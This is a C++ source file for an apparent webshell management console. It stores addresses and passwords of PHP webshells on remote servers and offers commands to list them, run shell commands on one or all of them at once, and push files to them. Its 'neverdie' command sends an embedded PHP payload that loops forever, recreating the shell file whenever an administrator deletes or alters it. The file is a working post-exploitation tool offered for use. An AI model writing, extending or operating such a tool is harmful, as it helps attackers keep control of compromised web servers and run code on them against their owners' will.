#include"WebShell.h"
#include<iostream>
#include<string>
#include<vector>
#include<sstream>
#include<exception>
#include<thread>
#include<mutex>
#include"json.hpp"

using namespace std;
using json = nlohmann::json;
vector<WebShell> shells;
json j;
mutex mtx;

class OutofBondExcetion:public exception{
public:
	OutofBondExcetion():exception(logic_error("Error:webshell out of bond\n")){
	}
};


bool addShell(WebShell shell){
	try{
		shells.push_back(shell);
	}
	catch(exception& e){
		cout<<"[-]failed to add new shell:"<<e.what()<<endl;
		return false;
	}
	return true;
}

CURLcode ExecuteCommand(int shellid,string command,string& answer){
	if(shellid<0 || shellid>shells.size())throw OutofBondExcetion();
	return shells[shellid].ShellCommandExec(command,answer);
}
void neverdie(int shellid){
	if(shellid<0 ||shellid>shells.size())throw OutofBondExcetion();
	string payload="error_reporting(0);"
"ignore_user_abort(true);"
"set_time_limit(0);"
"$mb = preg_replace(\"/\\((.*)$/\",'',__FILE__);"
"$nr =file_get_contents($mb); "
"$md5=md5($nr);"
"while (1==1) {"
"if(!file_exists($mb) || file_get_contents($mb)!=$nr) {"
 "if(file_exists($mb))@unlink($mb);" 
"file_put_contents($mb, $nr); "
"usleep(100000);"
"}"
"};";
	string ans;
	shells[shellid].php_exec(payload,ans);
	cout<<"thread terminated:"<<ans<<endl;
}
void execCommand(int shellid,string command,bool sync){
	if(shellid<0 || shellid>shells.size())throw OutofBondExcetion();
	string answer;
	ExecuteCommand(shellid,command,answer);
	if(sync){
		if(mtx.try_lock()){
		cout<<"executing command "<<command<<" on "<<shells[shellid].getAddress()<<endl;
		cout<<"-------------------------------------------"<<endl;
		cout<<answer<<endl;
		cout<<"-------------------------------------------"<<endl;
		mtx.unlock();
		}
	}
	else{
		cout<<"executing command "<<command<<" on "<<shells[shellid].getAddress()<<endl;
		cout<<"-------------------------------------------"<<endl;
		cout<<answer<<endl;
		cout<<"-------------------------------------------"<<endl;
	}
}
void pushFile(int shellid,string source,string dest,bool sync){
	if(shellid<0 || shellid>shells.size())throw OutofBondExcetion();
	shells[shellid].UploadFile(source,dest);
	if(sync){
		if(mtx.try_lock()){
		cout<<"[+]push file "<<source<<" to "<<dest<<" on "<<shells[shellid].getAddress()<<" finished "<<endl;
		mtx.unlock();
		}
	}
	else{
		cout<<"[+]push file "<<source<<" to "<<dest<<" on "<<shells[shellid].getAddress()<<" finished "<<endl;
	}
}
WebShell parseShell(json shell){
	METHOD meth;
	if(shell["method"].get<string>()=="GET")meth=GET;
	else meth=POST;
	WebShell temp(shell["address"].get<string>(),meth,shell["pass"].get<string>());
	if(shell["custom"].is_object()){
		if(shell["custom"]["encrypt"].is_string())
			temp.ParseMethod(shell["custom"]["encrypt"].get<string>());
		if(shell["custom"]["place"].is_string() && shell["custom"]["placevalue"].is_string())
			temp.setPlace(shell["custom"]["place"].get<string>(),shell["custom"]["placevalue"].get<string>());
		if(shell["custom"]["addonget"].is_object()){
			for(json::iterator getIter=shell["custom"]["addonget"].begin();getIter!=shell["custom"]["addonget"].end();++getIter){
				temp.addAddonGet(getIter.key(),getIter.value().get<string>());
			}
		}
		if(shell["custom"]["addonpost"].is_object()){
			for(json::iterator postIter=shell["custom"]["addonpost"].begin();postIter!=shell["custom"]["addonpost"].end();++postIter){
				temp.addAddonPost(postIter.key(),postIter.value().get<string>());
			}
		}
	}
	j.push_back(shell);
	fstream of("shells.json",ios::out);
	of<<j;
	of.close();
	return temp;
}
template<typename T>T stringToNum(string &str){
	istringstream stream(str.c_str());
	T num;
	stream>>num;
	return num;
}
vector<thread> threads;
int main(){
	try{
		ifstream config("shells.json");
		if(config.is_open()){
			config>>j;
		}
		config.close();
		if(j.is_array()){
			for(json::iterator it=j.begin();it!=j.end();++it){
				METHOD meth;
				if((*it)["method"].get<string>()=="GET")meth=GET;
				else meth=POST;
				WebShell temp((*it)["address"].get<string>(),meth,(*it)["pass"].get<string>());
				if((*it)["custom"].is_object()){
					if((*it)["custom"]["encrypt"].is_string())
						temp.ParseMethod((*it)["custom"]["encrypt"].get<string>());
					if((*it)["custom"]["place"].is_string() && (*it)["custom"]["placevalue"].is_string())
						temp.setPlace((*it)["custom"]["place"].get<string>(),(*it)["custom"]["placevalue"].get<string>());
					if((*it)["custom"]["addonget"].is_object()){
						for(json::iterator getIter=(*it)["custom"]["addonget"].begin();getIter!=(*it)["custom"]["addonget"].end();++getIter){
							temp.addAddonGet(getIter.key(),getIter.value().get<string>());
						}
					}
					if((*it)["custom"]["addonpost"].is_object()){
						for(json::iterator postIter=(*it)["custom"]["addonpost"].begin();postIter!=(*it)["custom"]["addonpost"].end();++postIter){
							temp.addAddonPost(postIter.key(),postIter.value().get<string>());
						}
					}
				}
				shells.push_back(temp);
			}
		}
	}
		catch(exception& e){
			cout<<"[-]exception occured:"<<e.what()<<endl;
		}
		string command;
		cout<<">";
		while(getline(cin,command)){
			try{
			vector<string> parseRes;
			int begin,end;
			begin=end=0;
			int i=0;
			while((end=command.find(' ',begin))!=string::npos){
				parseRes.push_back(command.substr(begin,end-begin));
				begin=command.find_first_not_of(' ',end);
				i++;
				//if(i==2) 
				//break;
			}
			parseRes.push_back(command.substr(begin));
			if(parseRes.size()>0){
				if(parseRes[0]=="add"){
					if(parseRes.size()<2){
						cerr<<"[-]invalid syntax"<<endl;
						continue;
					}
					auto temp=json::parse(command.substr(parseRes[0].length()));
					if(temp.is_object()){
						shells.push_back(parseShell(temp));
					}
					else{
						cerr<<"[-]parse error"<<endl;
						continue;
					}
				}
				else if(parseRes[0]=="delete"){
					if(parseRes.size()<2){
						cerr<<"[-]invalid syntax"<<endl;
						continue;
					}
					int num=stringToNum<int>(parseRes[1]);
					if(num>=shells.size() || num<0){
						cerr<<"[-]num exceeded"<<endl;
						continue;
					}
					shells.erase(shells.begin()+num);
					j.erase(j.begin()+num);
					fstream config("shells.json",ios::out);
					config<<j;
					config.close();
				}
				else if(parseRes[0]=="execute"){
					if(parseRes.size()<3){
						cerr<<"[-]invalid syntax"<<endl;
						continue;
					}
					if(parseRes.size()>3){
						for(int i=3;i<parseRes.size();i++){
							parseRes[2]+=' '+parseRes[i]; 
						}
					}
					if(parseRes[1]=="all"){
						for(int i=0;i<shells.size();i++){
							threads.push_back(thread(execCommand,i,parseRes[2],true));	
						}
						threads[threads.size()-1].join();
						//delete[] threads;
					}
					else{
						int num=stringToNum<int>(parseRes[1]);
						if(num>=shells.size() || num<0){
							cerr<<"[-]num exceeded"<<endl;
							continue;
						}
						cout<<"executing command "<<parseRes[2]<<" on "<<shells[num].getAddress()<<endl;
						cout<<"-------------------------------------------"<<endl;
						string answer;
						shells[num].ShellCommandExec(parseRes[2],answer);
						cout<<answer<<endl;
						cout<<"-------------------------------------------"<<endl;
					}
				}
				else if(parseRes[0]=="list"){
					for(vector<WebShell>::iterator it=shells.begin();it!=shells.end();++it){
						cout<<"Shell["<<it-shells.begin()<<"] on "<<it->getAddress()<<endl;
					}
				}
				else if(parseRes[0]=="push"){
					if(parseRes.size()<4){
						cerr<<"[-]invalid syntax "<<parseRes.size()<<endl;
						continue;
					}
					string sourcepath;
					string destpath;
					if(parseRes.size()==4){
						sourcepath=parseRes[2];
						destpath=parseRes[3];
					}
					else{
						string* paths[2];
						paths[0]=&sourcepath;
						paths[1]=&destpath;
						int point=0;
						for(int j=3;j<parseRes.size();j++){
							if(parseRes[j][parseRes[j].length()-1]!='\\')point++;
							if(point>1)break;
							(*paths[point])+=(parseRes[j][parseRes[j].length()-1]=='\\'?parseRes[j].substr(0,parseRes[j].length()-1)+' ':parseRes[j]);
						}
					}
					if(parseRes[1]=="all"){
						for(int i=0;i<shells.size();i++){
							threads.push_back(thread(pushFile,i,sourcepath,destpath,true));
						}
					}else{
						threads.push_back(thread(pushFile,stringToNum<int>(parseRes[1]),sourcepath,destpath,true));
					}

				}
				else if(parseRes[0]=="neverdie"){
					if(parseRes.size()<2){
						cerr<<"[-]syntax error"<<endl;
						continue;
					}
					int shellid=stringToNum<int>(parseRes[1]);
					threads.push_back(thread(neverdie,shellid));
				}
				else{
					cout<<"[+]Usage:\n"
					"list: show all the shells\n"
					"add jsondata:add a shell\n"
					"delete index:delete a shell\n"
					"execute index command: execute command on a shell or all the shells\n"
					"push index sourcepath destpath: push file to the remote server\n"
				"neverdie index: update current shell to neverdie mode\n"
					<<endl;
				}
			}
			else{
				cout<<"[+]Usage:\n"
				"list: show all the shells\n"
				"add jsondata:add a shell\n"
				"delete index:delete a shell\n"
				"execute index command: execute command on a shell or all the shells\n"
				"push index sourcepath destpath: push file to the remote server\n"
				"neverdie index: update current shell to neverdie mode\n"
				<<endl;
			}
		}
		catch(exception& e){
			cout<<"[-]exception occured:"<<e.what()<<endl;
		}
		cout<<">";
	}
	
}
